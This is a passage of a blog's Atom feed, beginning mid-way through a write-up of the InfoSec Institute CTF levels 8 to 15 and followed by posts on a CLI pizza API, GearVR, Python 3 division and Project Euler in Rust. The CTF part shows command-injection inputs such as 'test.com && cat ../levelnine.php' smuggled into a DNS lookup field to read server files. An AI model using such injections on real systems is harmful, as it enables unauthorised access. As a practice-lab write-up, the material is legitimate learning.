   0x004012d5 &amp;lt;+69&amp;gt;:    call   0x401850 &amp;lt;printf&amp;gt;
   0x004012da &amp;lt;+74&amp;gt;:    movl   $0x403014,(%esp)
   0x004012e1 &amp;lt;+81&amp;gt;:    call   0x401850 &amp;lt;printf&amp;gt;
   0x004012e6 &amp;lt;+86&amp;gt;:    movl   $0x403072,(%esp)
   0x004012ed &amp;lt;+93&amp;gt;:    call   0x401840 &amp;lt;system&amp;gt;
   0x004012f2 &amp;lt;+98&amp;gt;:    call   0x4017c0 &amp;lt;getch&amp;gt;
   0x004012f7 &amp;lt;+103&amp;gt;:   mov    $0x0,%eax
   0x004012fc &amp;lt;+108&amp;gt;:   leave
   0x004012fd &amp;lt;+109&amp;gt;:   ret
   0x004012fe &amp;lt;+110&amp;gt;:   nop
   0x004012ff &amp;lt;+111&amp;gt;:   nop
End of assembler dump&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;There we see a fimilar address. Checking its contents&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="go"&gt;gdb$ x/s 0x403000
0x403000:        &amp;quot;infosec_flagis_0x1a&amp;quot;&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;There's nothing that would indicate that this string changes, so for now, I'm
going to say the flag is:&lt;/p&gt;
&lt;blockquote&gt;
infosec_flagis_0x1a&lt;/blockquote&gt;
&lt;p&gt;Leave a comment below to correct me if I am wrong though, I'd really appreciate that.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="level-09"&gt;
&lt;h2&gt;Level 09&lt;/h2&gt;
&lt;p&gt;&lt;a class="reference external" href="http://ctf.infosecinstitute.com/levelnine.php"&gt;http://ctf.infosecinstitute.com/levelnine.php&lt;/a&gt;&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/5XnlOL9.png" /&gt;
&lt;p&gt;Initially I struggled with this. I tried the usual default passwords without success.
Attacked it with SQL injections, nothing. Then I had a brainwave. Because I already had level15,
I could just look at the :code:&lt;tt class="docutils literal"&gt;&lt;span class="pre"&gt;levelnine.php`:code:`&lt;/span&gt; file. So I did. Issue &lt;span class="pre"&gt;`:code:`test.com&lt;/span&gt; &amp;amp;&amp;amp; cat &lt;span class="pre"&gt;../levelnine.php&lt;/span&gt;&lt;/tt&gt;
and at the end we see what happens if we get the flag:&lt;/p&gt;
&lt;pre class="code javascript literal-block"&gt;
&lt;span class="nx"&gt;alert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;'ssaptluafed_sigalf_cesofni'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;It's the flag reversed, so let's flip it to get:&lt;/p&gt;
&lt;blockquote&gt;
infosec_flagis_defaultpass&lt;/blockquote&gt;
&lt;p&gt;ti tog yllaniF&lt;/p&gt;
&lt;p&gt;PS: What's even cuter is if you run :code:&lt;tt class="docutils literal"&gt;test.com &amp;amp;&amp;amp; tac &lt;span class="pre"&gt;../levelnine.php&lt;/span&gt;&lt;/tt&gt;. You actually
get the popup. :code:&lt;tt class="docutils literal"&gt;&lt;span class="pre"&gt;tac`:code:`&lt;/span&gt; does the same as &lt;span class="pre"&gt;`:code:`cat&lt;/span&gt;&lt;/tt&gt;, but reverses the lines in the output.
The reason this works is because it will encounter the javascript pop up code before
the conditional that checks the input.&lt;/p&gt;
&lt;p&gt;It also prints out the username and password for us:
.. code:: php&lt;/p&gt;
&lt;blockquote&gt;
&lt;dl class="docutils"&gt;
&lt;dt&gt;?&amp;gt; } echo &amp;quot;&amp;quot;; if ($username == 'root' and $password == 'attack') {&lt;/dt&gt;
&lt;dd&gt;$password = $_POST['password'];
$username = $_POST['username'];&lt;/dd&gt;
&lt;/dl&gt;
&lt;/blockquote&gt;
&lt;p&gt;Now you can go to the levelnine url and enter that to get the flag. Either way should
be valid, as the aim of the game is to get the flag. It shouldn't matter how you get it :)&lt;/p&gt;
&lt;p&gt;Level15 has been a huge help in all of this!&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="level-10"&gt;
&lt;h2&gt;Level 10&lt;/h2&gt;
&lt;p&gt;&lt;a class="reference external" href="http://ctf.infosecinstitute.com/levelten.php"&gt;http://ctf.infosecinstitute.com/levelten.php&lt;/a&gt;&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/QENqipl.png" /&gt;
&lt;p&gt;Let's listen to the sound. Hrmm Squeaky. Could be anything. Maybe some weirdly pitched morse.
But let's download and open it in Audacity. My initial hunch is that it's sped up, due
to the highpitched sound. So I started reducing the playback speed, and it turns out that
at around 0.15 times the original speed, we hear someone talking. He's actually telling us
the name of the flag&lt;/p&gt;
&lt;blockquote&gt;
infosec_flagis_sound&lt;/blockquote&gt;
&lt;p&gt;Thanks kind stranger&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="level-11"&gt;
&lt;h2&gt;Level 11&lt;/h2&gt;
&lt;p&gt;&lt;a class="reference external" href="http://ctf.infosecinstitute.com/leveleleven.php"&gt;http://ctf.infosecinstitute.com/leveleleven.php&lt;/a&gt;&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/L2tFy5t.png" /&gt;
&lt;p&gt;Hrmm.. there's no sound this time, instead we get the PHP logo. Well, it's all
we have so let's open it up. I loaded it into vim, changed to hex mode (:%!xxd)
and right at the top we have&lt;/p&gt;
&lt;blockquote&gt;
infosec_flagis_aHR0cDovL3d3dy5yb2xsZXJza2kuY28udWsvaW1hZ2VzYi9wb3dlcnNsaWRlX2xvZ29fbGFyZ2UuZ2lm&lt;/blockquote&gt;
&lt;p&gt;Yeah, that won't be it will it? We're very familiar with base64 now aren't we? Ok, decode&lt;/p&gt;
&lt;blockquote&gt;
&lt;a class="reference external" href="http://www.rollerski.co.uk/imagesb/powerslide_logo_large.gif"&gt;http://www.rollerski.co.uk/imagesb/powerslide_logo_large.gif&lt;/a&gt;&lt;/blockquote&gt;
&lt;p&gt;Open it up and we get an image. Because the domain is outside of the control of
this CTF, we can assume that the image hasn't been tampered with or anything
is embedded in it and that the actual flag is:&lt;/p&gt;
&lt;blockquote&gt;
infosec_flagis_powerslide&lt;/blockquote&gt;
&lt;p&gt;I'll take it, thanks!&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="level-12"&gt;
&lt;h2&gt;Level 12&lt;/h2&gt;
&lt;p&gt;&lt;a class="reference external" href="http://ctf.infosecinstitute.com/leveltwelve.php"&gt;http://ctf.infosecinstitute.com/leveltwelve.php&lt;/a&gt;&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/WdLl96v.png" /&gt;
&lt;p&gt;Ok we recognise this image. We had it in level 1 and we had to look at the source.
Our clue is dig deeper and that could mean a number of things. Let's try some directory
traversal by appending a slash and some random text at the end. Hrm, we just
get a list of the levels and no css. Ok, that's not it. Let's dig into the source again.
There's nothing obvious, but I reckon it might be one of the files included in the source.
It would make sense given the clue we've been given.&lt;/p&gt;
&lt;p&gt;To cut a long story short, there's a css file :code:&lt;tt class="docutils literal"&gt;design.css&lt;/tt&gt; that's not included
in the other pages. I know this because I've pretty much looked at the source for each
level. Force of habit. Anyway, let's take a look at it:&lt;/p&gt;
&lt;pre class="code css literal-block"&gt;
&lt;span class="nc"&gt;.thisloveis&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nb"&gt;color&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="m"&gt;#696e666&lt;/span&gt;&lt;span class="n"&gt;f7365635f666c616769735f686579696d6e6f7461636f6c6f72&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Aha, that's not a valid colour is it? It's also not base64. Looks like hex values
to me. Run it through a hex to text converter and.....&lt;/p&gt;
&lt;blockquote&gt;
infosec_flagis_heyimnotacolor&lt;/blockquote&gt;
&lt;p&gt;Yeah, you weren't a colour, that's for sure.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="level-13"&gt;
&lt;h2&gt;Level 13&lt;/h2&gt;
&lt;p&gt;&lt;a class="reference external" href="http://ctf.infosecinstitute.com/levelthirteen.php"&gt;http://ctf.infosecinstitute.com/levelthirteen.php&lt;/a&gt;&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/JX3Je1g.png" style="width: 500px;" /&gt;
&lt;p&gt;Ok, this was a bit of a cheat, because I skipped to level 15 and now I have a a few more
tools available. I ran :code:&lt;tt class="docutils literal"&gt;test.com &amp;amp;&amp;amp; ls &lt;span class="pre"&gt;-la&lt;/span&gt; ..&lt;/tt&gt; and voila, there's the backup file:
:code:&lt;tt class="docutils literal"&gt;levelthirteen.php.old&lt;/tt&gt;. Much easier than guessing, right?
Looking at this file we see it will prompt us to download a file called :code:&lt;tt class="docutils literal"&gt;misc/imadecoy&lt;/tt&gt;.
This seems to be a network capture involving a project called &lt;a class="reference external" href="https://github.com/shipcod3/honeypy"&gt;HoneyPy&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;I opened it up in wireshark and spent quite a bit of time on it. There's really nothing
interesting in it for the most part. However near the end we get a PNG image called
:code:&lt;tt class="docutils literal"&gt;HoneyPY.PNG&lt;/tt&gt;. For some reason this just stood out to me. I took a chance and exported it
by rightclicking the packet and selecting :code:&lt;tt class="docutils literal"&gt;Export Selected Packet Bytes&lt;/tt&gt; as shown&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/jhH2v19.png" style="width: 500px;" /&gt;
&lt;p&gt;Opening this image surprises us with a flag! W00t! That flag is:&lt;/p&gt;
&lt;blockquote&gt;
infosec_flagis_morepackets&lt;/blockquote&gt;
&lt;p&gt;A wireshark level I managed to do. Yay&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="level-14"&gt;
&lt;h2&gt;Level 14&lt;/h2&gt;
&lt;p&gt;&lt;a class="reference external" href="http://ctf.infosecinstitute.com/levelfourteen.php"&gt;http://ctf.infosecinstitute.com/levelfourteen.php&lt;/a&gt;&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/0akB0Ni.png" /&gt;
&lt;p&gt;UPDATE: The :code:&lt;tt class="docutils literal"&gt;&lt;span class="pre"&gt;level14.db`:code:`&lt;/span&gt; file has been removed and the &lt;span class="pre"&gt;`:code:`misc&lt;/span&gt;&lt;/tt&gt; directory can
no longer be listed. Use the second method below to solve this level&lt;/p&gt;
&lt;p&gt;Once downloaded we get a database backup file. This one was quite interesting because
there are two places where the flag is. So first I looked at what else is in the
:code:&lt;tt class="docutils literal"&gt;&lt;span class="pre"&gt;misc`:code:`&lt;/span&gt; directory where this file lives. There's a &lt;span class="pre"&gt;`:code:`level14.db&lt;/span&gt;&lt;/tt&gt; file. Let's
take a look at that.&lt;/p&gt;
&lt;p&gt;It adds an entry to the flag db. It's a hex string, so like above, simply decode it and
get&lt;/p&gt;
&lt;blockquote&gt;
infosec_flagis_whatsorceryisthis&lt;/blockquote&gt;
&lt;p&gt;But, look at the :code:&lt;tt class="docutils literal"&gt;level14&lt;/tt&gt; file again. Scroll through and notice that in the
&lt;code&gt;friends&lt;/code&gt; table there's a fimilar entry. Decoding that will also give you the flag.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="level-15"&gt;
&lt;h2&gt;Level 15&lt;/h2&gt;
&lt;p&gt;&lt;a class="reference external" href="http://ctf.infosecinstitute.com/levelfifteen/index.php"&gt;http://ctf.infosecinstitute.com/levelfifteen/index.php&lt;/a&gt;&lt;/p&gt;
&lt;img alt="" src="http://i.imgur.com/EVJuDmC.png" /&gt;
&lt;p&gt;So here we can lookup a dns entry by typing a domain in the text field. So let's try
that and see what we get. I used :code:&lt;tt class="docutils literal"&gt;test.com&lt;/tt&gt; and as a result I get the output
from the :code:&lt;tt class="docutils literal"&gt;dig&lt;/tt&gt; command. Interesting. It could be that the php script is merely
calling :code:&lt;tt class="docutils literal"&gt;dig&lt;/tt&gt; with the search term appended to it. This is a bad way to execute
a command, and we will see why. In Linux you can append a command to another using :code:&lt;tt class="docutils literal"&gt;&amp;amp;&amp;amp;&lt;/tt&gt;.
So let's try listing the directory with :code:&lt;tt class="docutils literal"&gt;&lt;span class="pre"&gt;test.com&amp;amp;&amp;amp;ls&lt;/span&gt;&lt;/tt&gt; as our search query. Sure enough,
we see :code:&lt;tt class="docutils literal"&gt;index.php&lt;/tt&gt; at the bottom of the output. Well, perhaps there's some hidden files so
let's run :code:&lt;tt class="docutils literal"&gt;test.com &amp;amp;&amp;amp; ls &lt;span class="pre"&gt;-la`:code:`.&lt;/span&gt; Aha, there's a file called &lt;span class="pre"&gt;`:code:`.hey&lt;/span&gt;&lt;/tt&gt;, let's cat that with
:code:&lt;tt class="docutils literal"&gt;test.com &amp;amp;&amp;amp; cat &lt;span class="pre"&gt;.hey`:code:`&lt;/span&gt; and we get &lt;span class="pre"&gt;`:code:`Miux+mT6Kkcx+IhyMjTFnxT6KjAa+i6ZLibC&lt;/span&gt;&lt;/tt&gt;&lt;/p&gt;
&lt;p&gt;Not sure however where to go from here. The ZlibC at the end of the string might
be a clue.&lt;/p&gt;
&lt;p&gt;Please leave any comments with ideas on this. I'm a bit stumped.&lt;/p&gt;
&lt;p&gt;UPDATE: Turns out it's Atom 128 adn you can use &lt;a class="reference external" href="http://crypo.in.ua/tools/eng_atom128c.php"&gt;this decoder&lt;/a&gt;
to decode it to &lt;code&gt;infosec_flagis_rceatomized&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Thanks to Anon and &amp;#64;fr1t3 for the info&lt;/p&gt;
&lt;p&gt;ALL FLAGS DONE&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="the-lost-level"&gt;
&lt;h2&gt;The lost level&lt;/h2&gt;
&lt;p&gt;UPDATED: This has since been removed, but I've left this here for posterity.&lt;/p&gt;
&lt;p&gt;Not sure where this belongs, but in the misc folder is a file called :code:&lt;tt class="docutils literal"&gt;readme.wav&lt;/tt&gt;
which contains the morsecode for&lt;/p&gt;
&lt;blockquote&gt;
INFOSECFLAGISMORSECODETONES&lt;/blockquote&gt;
&lt;p&gt;Which level this belongs to, I don't know.&lt;/p&gt;
&lt;/div&gt;
</summary></entry><entry><title>CLI Pizza</title><link href="http://unlogic.co.uk/2015/03/04/cli-pizza/" rel="alternate"></link><updated>2015-03-04T22:00:00+00:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2015-03-04:2015/03/04/cli-pizza/</id><summary type="html">&lt;p&gt;Recently someone was talking about ordering Pizza from within
&lt;a class="reference external" href="http://sidefx.com"&gt;Houdini&lt;/a&gt;. I figured that it must be possible somehow.
I looked for an API and only found a US based, possibly out of date,
&lt;a class="reference external" href="https://www.npmjs.com/package/dominos"&gt;API for Dominos&lt;/a&gt; written in node.js.
However I needed one that worked with the UK version of the Dominos site.
So I began working on deconstructing the URLs that the Dominos site uses to get
menus, place orders and such, and started building a Python API around that.&lt;/p&gt;
&lt;p&gt;So far I've got a few features working and am happy with the progress. Here's
a little video of how it works at this stage:&lt;/p&gt;
&lt;script type="text/javascript" src="https://asciinema.org/a/17295.js" id="asciicast-17295" async&gt;&lt;/script&gt;&lt;p&gt;Quite a bit to do still, but happy with the progress. I'm planning to write up how
I figured out all the API calls in order to interact with their backend, so stay
tuned for that. Follow on &lt;a class="reference external" href="https://www.titter.com/binaryheadache"&gt;Twitter&lt;/a&gt; or
subscribe to the &lt;a class="reference external" href="http://unlogic.co.uk/feed.xml"&gt;RSS&lt;/a&gt;. The code will go up
on Github once it's more feature complete.&lt;/p&gt;
&lt;p&gt;UPDATE: &lt;a class="reference external" href="https://github.com/Svenito/dominos"&gt;it's on github&lt;/a&gt;&lt;/p&gt;
</summary></entry><entry><title>Why I think Gear VR is the way forward</title><link href="http://unlogic.co.uk/2015/02/10/why-i-think-gear-vr-is-the-way-forward/" rel="alternate"></link><updated>2015-02-10T09:00:00+00:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2015-02-10:2015/02/10/why-i-think-gear-vr-is-the-way-forward/</id><summary type="html">&lt;p&gt;Recently I've been lucky enough to try out and work with the DK2 and the Samsung
GearVR, and while both do what they do really well, I much prefer my experience
with the GearVR. This isn't down to a technical advantage like improved
resolution, or the way it looks, it's about the experience. I've strapped on the
DK2 more times that I can remember, and I've set it up as many times too. I hate
setting it up. There's a plethora of cables. You have a USB cable for the headset
and one for the tracking camera. Then there's a cable to connect the
tracking camera to the headset line. Add a power supply and a HDMI lead and
you're now totalling 5 plugs you need to connect to set it up. Then you need
to configure the headset, making sure that the setting for the desktop are correct.
Some apps need direct to DK2, others need the dekstop extended, except when you
are on Windows 8, where it always needs to be extended. I've managed to work
myself up just writing about it.&lt;/p&gt;
&lt;p&gt;So enter the GearVR. The empty headset lands on my desk and I unpack it. It looks
like a something a strom trooper would strap to their face. It's light. Well, there's
no phone in it yet. We order a Samsung Note 4 and once it arrives I go about setting
it up and installing all the necessary software. The SD card that comes with the headset
contains all the required software to get you started and once the main software is
installed, you can install more via its built-in store/library. So I clip the phone into
the headset and put it on. It's still much lighter than the DK2, so I hope that the new
Rift will be a little bit lighter too. The interface is clean and easy to use. I haven't
got a gamepad, so I use the onboard swipe based controller and buttons to navigate.
It all works like a charm. But wait, there's something weird.... that's right, not
a single cable in sight. I can actually get up and walk around in it. Disclaimer:
that's a bad idea, stay put! I like the interface, it all seems very straightforward
and natural. The only issue I have is that my arm gets fatigued after a while of
having to hold it up to the side of the headset where the touchpad is. But I can
take it off and put it down without having to manage any cables, or worry about
getting caught up in a lead with my chair.&lt;/p&gt;
&lt;p&gt;Basically I can unclip the front, insert the phone, put it on, and get going.
Once connected to the headset, the phone automatically launches the VR software,
and it only plays if you have the headset on (there's a sensor inside for that).
It's as easy as that. This to me is a big win over something like the Oculus. Sure
the Rift has the power of a high end gaming PC behind it, but I still prefer to
experience this new world of VR through the Samsung GearVR.&lt;/p&gt;
&lt;p&gt;I've deliberately skirted around resolution, content and the like because those
are variable and to me, the big difference that made the GearVR more enjoyable to
use was how easy it was to setup and the lack of cables. If you've got a station
where you want to keep your VR setup, then the Rift will be a better choice, no
doubt. If however you want to play games, or watch movies whereever and whenever,
and not have to fiddle around with a mess of cables, then the GearVR is unbeatable.
And right now, the display quality on the GearVR beats the DK2 IMO. I imagine
that the next Rift will be on par though.&lt;/p&gt;
</summary></entry><entry><title>'Python</title><link href="http://unlogic.co.uk/2015/01/23/python/" rel="alternate"></link><updated>2015-01-23T09:00:00+00:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2015-01-23:2015/01/23/python/</id><summary type="html">&lt;p&gt;I've not really had much of a play with Python 3, but I'm aware of some of its
differences. Yesterday I found out about a difference that took me by surprise.
Enough of a surprise that I felt the urge to write this post.&lt;/p&gt;
&lt;div class="section" id="opinion-divided"&gt;
&lt;h2&gt;Opinion Divided&lt;/h2&gt;
&lt;p&gt;What surprised me was how &lt;code&gt;/&lt;/code&gt; has changed in Python 3. In Python 2.7 it returns
the result of the division of two numbers.&lt;/p&gt;
&lt;pre class="code python literal-block"&gt;
&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;
&lt;span class="mi"&gt;4&lt;/span&gt;
&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;
&lt;span class="mi"&gt;3&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Checks out to me. &lt;code&gt;10 / 3&lt;/code&gt; is 3.3333, and because we are using integers in
the expression, we expect an integer as the result.
Change the input to floats (or at least one of the inputs)&lt;/p&gt;
&lt;pre class="code python literal-block"&gt;
&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mf"&gt;3.0&lt;/span&gt;
&lt;span class="mf"&gt;3.3333333333333335&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;and we get a float. Right, nothing weird there. Where it starts getting odd is
that in Python 3 you &lt;strong&gt;always&lt;/strong&gt; get a float back, unless you use the &lt;code&gt;//&lt;/code&gt; operator.
Apparently that is because too many people expected integer division to return a float.
Maybe it's just me and my fellow oldies who think that the original behaviour is
correct and integer division should yield an integer, not a float. Pretty much all
main stream languages behave like this. In C/C++ you need to cast one of the arguments
to a float to get a float back.&lt;/p&gt;
&lt;pre class="code cpp literal-block"&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
&lt;/span&gt;
&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt; &lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;std&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;cout&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;std&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;endl&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="n"&gt;std&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;cout&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;float&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;std&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="n"&gt;endl&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="o"&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; ./a.out
&lt;span class="go"&gt;3
3.33333&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;I understand that if you are dividing numbers you will want to have
the accuracy of the float type, but I find this a bit of an odd choice
for the Python devs to make. But perhaps this is the future, and I'm
just too old to accept what you whippersnappers are up to with your
fancy &lt;a class="reference external" href="http://i.imgur.com/GUum4gy.gif"&gt;languages and tools&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Ultimately, does it really matter? Well yes and no. No, because Python is
dynamically typed, so it doesn't really matter what type the result is, whatever
it gets assigned too will become what it needs to. Yes, because there may be
times when getting a float might cause unexpected behaviour.&lt;/p&gt;
&lt;p&gt;It's not the end of the world as such, because the &lt;em&gt;no&lt;/em&gt; above greatly
outweighs the &lt;em&gt;yes&lt;/em&gt;, but I'm still a little surprised at this change. I would
perhaps have kept &lt;code&gt;/&lt;/code&gt; as it is and made &lt;code&gt;//&lt;/code&gt; the one that always returns a float.&lt;/p&gt;
&lt;p&gt;And just to finish:&lt;/p&gt;
&lt;pre class="code python literal-block"&gt;
&lt;span class="n"&gt;Python&lt;/span&gt; &lt;span class="mf"&gt;3.4&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;
&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;
&lt;span class="mi"&gt;3&lt;/span&gt;
&lt;span class="o"&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="mf"&gt;3.0&lt;/span&gt;
&lt;span class="mf"&gt;3.0&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;a class="reference external" href="http://i.imgur.com/WEllYN3.gif"&gt;Yeah, sure, why not?&lt;/a&gt;&lt;/p&gt;
&lt;/div&gt;
</summary></entry><entry><title>Solving Project Euler with Rust 2</title><link href="http://unlogic.co.uk/2015/01/20/solving-project-euler-with-rust-2/" rel="alternate"></link><updated>2015-01-20T21:00:00+00:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2015-01-20:2015/01/20/solving-project-euler-with-rust-2/</id><summary type="html">&lt;p&gt;Carrying on with &lt;a class="reference external" href="http://unlogic.co.uk/2015/01/12/solving-project-euler-with-rust-1/"&gt;the series&lt;/a&gt;, here's
how I solved Project Euler's problem 2:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Even Fibonacci numbers
Problem 2
Each new term in the Fibonacci sequence is generated by adding the previous
two terms. By starting with 1 and 2, the first 10 terms will be:&lt;/p&gt;
&lt;blockquote&gt;
1, 2, 3, 5, 8, 13, 21, 34, 55, 89, ...&lt;/blockquote&gt;
&lt;p&gt;By considering the terms in the Fibonacci sequence whose values do not
exceed four million, find the sum of the even-valued terms.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Fairly similar to the previous one, in terms that we need to sum a sequence
of filtered numbers. This time though the sequence is not a straight run,
but the fibonacci sequence.&lt;/p&gt;
&lt;p&gt;As usual with these issues I assume we will need a recursive function to generate
our fibonacci numbers:&lt;/p&gt;
&lt;pre class="code rust literal-block"&gt;
&lt;span class="k"&gt;fn&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;fib&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;i32&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;i32&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;
    &lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;
        &lt;/span&gt;&lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt;
    &lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;n&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;==&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;
        &lt;/span&gt;&lt;span class="k"&gt;return&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt;
    &lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;
